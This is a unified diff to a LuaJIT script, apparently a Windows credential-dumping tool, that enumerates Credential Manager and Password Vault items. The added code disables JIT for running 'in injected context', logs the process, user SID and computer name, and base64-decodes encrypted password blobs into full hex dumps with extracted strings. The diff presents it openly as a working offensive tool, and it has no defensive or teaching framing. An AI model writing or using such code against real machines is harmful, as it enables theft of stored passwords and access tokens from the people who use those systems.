@@ -6,6 +6,12 @@
 
 local ffi = require("ffi")
 
+-- Disable JIT when running in injected context
+if jit then
+    jit.off()   -- Disable JIT compiler globally
+    jit.flush() -- Flush any existing JIT compiled code
+end
+
 -- Configuration
 local CONFIG = {
     VERBOSE = true,
@@ -279,6 +285,57 @@ ffi.cdef[[
         LPDWORD nSize
     );
     
+    DWORD GetCurrentProcessId();
+    
+    HANDLE GetCurrentProcess();
+    
+    HANDLE OpenProcess(
+        DWORD dwDesiredAccess,
+        BOOL bInheritHandle,
+        DWORD dwProcessId
+    );
+    
+    BOOL GetUserNameA(
+        LPSTR lpBuffer,
+        LPDWORD pcbBuffer
+    );
+    
+    HANDLE GetCurrentThread();
+    
+    BOOL OpenProcessToken(
+        HANDLE ProcessHandle,
+        DWORD DesiredAccess,
+        HANDLE* TokenHandle
+    );
+    
+    BOOL GetTokenInformation(
+        HANDLE TokenHandle,
+        DWORD TokenInformationClass,
+        void* TokenInformation,
+        DWORD TokenInformationLength,
+        DWORD* ReturnLength
+    );
+    
+    typedef struct _SID_AND_ATTRIBUTES {
+        void* Sid;
+        DWORD Attributes;
+    } SID_AND_ATTRIBUTES;
+    
+    typedef struct _TOKEN_USER {
+        SID_AND_ATTRIBUTES User;
+    } TOKEN_USER;
+    
+    BOOL ConvertSidToStringSidA(
+        void* Sid,
+        LPSTR* StringSid
+    );
+    
+    DWORD GetModuleFileNameA(
+        HANDLE hModule,
+        LPSTR lpFilename,
+        DWORD nSize
+    );
+    
     // File operations
     HANDLE CreateFileA(
         LPCSTR lpFileName,
@@ -346,6 +403,68 @@ local INVALID_HANDLE_VALUE = ffi.cast("HANDLE", -1)
 -- Logging Functions (forward declaration)
 local log, debug_log
 
+-- Function to get current process context for DPAPI troubleshooting
+local function log_process_context()
+    log("\n[*] Process Context Information (for DPAPI troubleshooting):")
+    
+    -- Current Process ID
+    local pid = kernel32.GetCurrentProcessId()
+    log(string.format("    Process ID: %d", pid))
+    
+    -- Current Process Name
+    local proc_name = ffi.new("char[260]")
+    local name_len = kernel32.GetModuleFileNameA(nil, proc_name, 260)
+    if name_len > 0 then
+        local full_path = ffi.string(proc_name)
+        local name_only = full_path:match("([^\\]+)$") or full_path
+        log(string.format("    Process Name: %s", name_only))
+        log(string.format("    Process Path: %s", full_path))
+    end
+    
+    -- Current Username (GetUserNameA is in advapi32.dll)
+    local username = ffi.new("char[260]")
+    local username_len = ffi.new("DWORD[1]", 260)
+    if advapi32.GetUserNameA(username, username_len) ~= 0 then
+        log(string.format("    Username: %s", ffi.string(username)))
+    end
+    
+    -- Current User SID
+    pcall(function()
+        local TOKEN_QUERY = 0x0008
+        local TokenUser = 1
+        local token = ffi.new("HANDLE[1]")
+        
+        if advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_QUERY, token) ~= 0 then
+            local size = ffi.new("DWORD[1]")
+            advapi32.GetTokenInformation(token[0], TokenUser, nil, 0, size)
+            
+            if size[0] > 0 then
+                local buffer = ffi.new("uint8_t[?]", size[0])
+                if advapi32.GetTokenInformation(token[0], TokenUser, buffer, size[0], size) ~= 0 then
+                    local token_user = ffi.cast("TOKEN_USER*", buffer)
+                    local sid_string = ffi.new("LPSTR[1]")
+                    
+                    if advapi32.ConvertSidToStringSidA(token_user.User.Sid, sid_string) ~= 0 then
+                        log(string.format("    User SID: %s", ffi.string(sid_string[0])))
+                        ffi.C.LocalFree(sid_string[0])
+                    end
+                end
+            end
+            
+            kernel32.CloseHandle(token[0])
+        end
+    end)
+    
+    -- Computer Name
+    local computer = ffi.new("char[260]")
+    local comp_size = ffi.new("DWORD[1]", 260)
+    if kernel32.GetComputerNameA(computer, comp_size) ~= 0 then
+        log(string.format("    Computer: %s", ffi.string(computer)))
+    end
+    
+    log("")
+end
+
 local function init_log()
     local temp = ffi.new("char[260]")
     kernel32.GetEnvironmentVariableA("TEMP", temp, 260)
@@ -370,11 +489,29 @@ local function init_log()
             end
         end
         
+        write_log("=================================================================")
+        write_log("Windows Credential Manager & Password Vault Dump")
+        write_log("Time: " .. os.date("%Y-%m-%d %H:%M:%S"))
+        write_log("=================================================================")
+        
+        -- Set log function
+        log = write_log
+        debug_log = function(msg)
+            if CONFIG.DEBUG_DPAPI then
+                write_log("[DEBUG] " .. msg)
+            end
+        end
+        
+        -- Log process context for DPAPI troubleshooting
+        log_process_context()
+        
         write_log("[+] Log file created: " .. LOG_PATH)
-        write_log(string.format("[*] Dump started at: %s", os.date("%Y-%m-%d %H:%M:%S")))
         write_log(string.format("[*] Computer: %s", computer_name))
         write_log(string.rep("=", 80))
+        
+        return true
     end
+    return false
 end
 
 log = function(message)
@@ -532,6 +669,124 @@ local function is_printable(data, size)
     -- Consider printable if >70% printable chars (excluding nulls)
     local non_null = size - null_count
     return non_null > 0 and (printable_count / non_null) > 0.7
+end
+
+-- Base64 decoder
+local function decode_base64(str)
+    if not str then return nil end
+    
+    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    local b64lookup = {}
+    for i = 1, #b64chars do
+        b64lookup[b64chars:sub(i, i)] = i - 1
+    end
+    b64lookup['='] = 0
+    
+    local result = {}
+    local padding = 0
+    
+    for chunk in str:gmatch('....') do
+        if #chunk ~= 4 then break end
+        
+        local n = 0
+        local chars_in_chunk = 0
+        
+        for i = 1, 4 do
+            local c = chunk:sub(i, i)
+            if c == '=' then
+                padding = padding + 1
+            else
+                local val = b64lookup[c]
+                if val then
+                    n = n * 64 + val
+                    chars_in_chunk = chars_in_chunk + 1
+                else
+                    return nil -- Invalid base64
+                end
+            end
+        end
+        
+        -- Always shift to align properly
+        n = n * (64 ^ (4 - chars_in_chunk - padding))
+        
+        -- Extract bytes (3 bytes from 4 base64 chars)
+        table.insert(result, string.char(math.floor(n / 65536) % 256))
+        if padding < 2 then
+            table.insert(result, string.char(math.floor(n / 256) % 256))
+        end
+        if padding < 1 then
+            table.insert(result, string.char(n % 256))
+        end
+    end
+    
+    return table.concat(result)
+end
+
+-- Extract printable strings from binary data
+local function extract_strings(data, min_length)
+    min_length = min_length or 4
+    local strings = {}
+    local current = {}
+    
+    for i = 1, #data do
+        local byte = data:byte(i)
+        -- Check if printable ASCII (space to ~)
+        if byte >= 32 and byte <= 126 then
+            table.insert(current, string.char(byte))
+        else
+            if #current >= min_length then
+                table.insert(strings, table.concat(current))
+            end
+            current = {}
+        end
+    end
+    
+    -- Don't forget the last string
+    if #current >= min_length then
+        table.insert(strings, table.concat(current))
+    end
+    
+    return strings
+end
+
+-- Full hex dump of binary data (no limit)
+local function hexdump_full(data, label)
+    if not data or #data == 0 then return "" end
+    
+    local result = {}
+    table.insert(result, string.format("%s (%d bytes):", label or "Hex dump", #data))
+    
+    for i = 1, #data, 16 do
+        local hex_part = {}
+        local ascii_part = {}
+        
+        for j = 0, 15 do
+            if i + j <= #data then
+                local byte = data:byte(i + j)
+                table.insert(hex_part, string.format("%02X", byte))
+                
+                if byte >= 32 and byte <= 126 then
+                    table.insert(ascii_part, string.char(byte))
+                else
+                    table.insert(ascii_part, ".")
+                end
+            else
+                table.insert(hex_part, "  ")
+                table.insert(ascii_part, " ")
+            end
+        end
+        
+        local offset = i - 1
+        table.insert(result, string.format("  %08X: %s %s %s %s | %s",
+            offset,
+            table.concat(hex_part, " ", 1, 4),
+            table.concat(hex_part, " ", 5, 8),
+            table.concat(hex_part, " ", 9, 12),
+            table.concat(hex_part, " ", 13, 16),
+            table.concat(ascii_part)))
+    end
+    
+    return table.concat(result, "\n")
 end
 
 local function filetime_to_string(ft)
@@ -1357,11 +1612,11 @@ local function enumerate_vaults()
                                 -- Keep item with basic info even if VaultGetItem fails
                                 -- Applications may restrict access to their vault items from other contexts
                                 if get_result == 0x490 then
-                                    debug_log("Item not found (0x490) - application may restrict access to this credential")
-                                    log(string.format("[!] Vault item %d access denied (0x490) - app-restricted credential", j + 1))
+                                    debug_log("ERROR_NOT_FOUND (0x490) - application may restrict access to this credential")
+                                    log(string.format("[!] Vault item %d: ERROR_NOT_FOUND (0x490) - app-restricted credential", j + 1))
                                 elseif get_result == 0x80070005 then
-                                    debug_log("Access denied (0x80070005) - insufficient permissions")
-                                    log(string.format("[!] Vault item %d access denied (0x80070005) - insufficient permissions", j + 1))
+                                    debug_log("E_ACCESSDENIED (0x80070005) - insufficient permissions")
+                                    log(string.format("[!] Vault item %d: E_ACCESSDENIED (0x80070005) - insufficient permissions", j + 1))
                                 else
                                     log(string.format("[!] Vault item %d failed to decrypt (error: 0x%X)", j + 1, get_result))
                                 end
@@ -1533,11 +1788,31 @@ local function display_vaults(vaults)
                     for i = 1, #b64, 80 do
                         log("        " .. b64:sub(i, i + 79))
                     end
-                    if item.password_encrypted_binary then
-                        -- Show hex dump of first 64 bytes
-                        log("      Encrypted (hex, first 64 bytes):")
+                    
+                    -- Decode base64 and show full hex dump + extract strings
+                    local decoded = decode_base64(b64)
+                    if decoded and #decoded > 0 then
+                        log(string.format("      Decoded (%d bytes):", #decoded))
+                        
+                        -- Full hex dump (no limit)
+                        local hex_lines = hexdump_full(decoded, "      Encrypted (hex)")
+                        for line in hex_lines:gmatch("[^\n]+") do
+                            log(line)
+                        end
+                        
+                        -- Extract printable strings
+                        local strings = extract_strings(decoded, 4)
+                        if #strings > 0 then
+                            log("      Extracted strings:")
+                            for _, str in ipairs(strings) do
+                                log(string.format("        \"%s\"", str))
+                            end
+                        end
+                    elseif item.password_encrypted_binary then
+                        -- Fallback to binary hex dump if base64 decode failed
+                        log("      Encrypted (hex, full dump):")
                         local hex_line = {}
-                        for i = 1, math.min(64, #item.password_encrypted_binary) do
+                        for i = 1, #item.password_encrypted_binary do
                             table.insert(hex_line, string.format("%02X", item.password_encrypted_binary:byte(i)))
                             if #hex_line == 16 then
                                 log("        " .. table.concat(hex_line, " "))
@@ -1550,7 +1825,17 @@ local function display_vaults(vaults)
                     end
                     log("      Note:         Run from within application context to decrypt")
                 elseif item.vault_access_denied then
-                    log(string.format("      Password:     [ACCESS DENIED - Error %s]", item.vault_access_error or "unknown"))
+                    local error_code = item.vault_access_error or "unknown"
+                    local error_name = "UNKNOWN"
+                    
+                    -- Map error codes to Windows SDK names
+                    if error_code == "0x490" then
+                        error_name = "ERROR_NOT_FOUND"
+                    elseif error_code == "0x80070005" then
+                        error_name = "E_ACCESSDENIED"
+                    end
+                    
+                    log(string.format("      Password:     [%s - Error %s]", error_name, error_code))
                     log("      Note:         Application-restricted credential, run from app context to access")
                 else
                     log("      Password:     [Not Available]")
@@ -1694,9 +1979,32 @@ local function main()
     end
 end
 
--- Execute
-local status, err = pcall(main)
+-- Execute with robust error handling for injected context
+local status, err = pcall(function()
+    -- Additional safety: ensure all FFI calls are wrapped
+    local init_status, init_err = pcall(init_log)
+    if not init_status then
+        print(string.format("[!] Log initialization failed: %s", init_err))
+        print("[!] Continuing without logging...")
+    end
+    
+    -- Run main with error recovery
+    return main()
+end)
+
 if not status then
-    print(string.format("\n[!] Error: %s", err))
-    print("[!] Make sure you're running with appropriate privileges")
+    local err_msg = tostring(err)
+    print(string.format("\n[!] Critical Error: %s", err_msg))
+    print("[!] This may be due to:")
+    print("    - Insufficient privileges (try running as Administrator)")
+    print("    - Memory access violations in injected context")
+    print("    - FFI/JIT issues (JIT should be disabled)")
+    
+    -- Try to log error if possible
+    if LOG_FILE then
+        pcall(function()
+            LOG_FILE:write(string.format("\n[ERROR] %s\n", err_msg))
+            LOG_FILE:close()
+        end)
+    end
 end
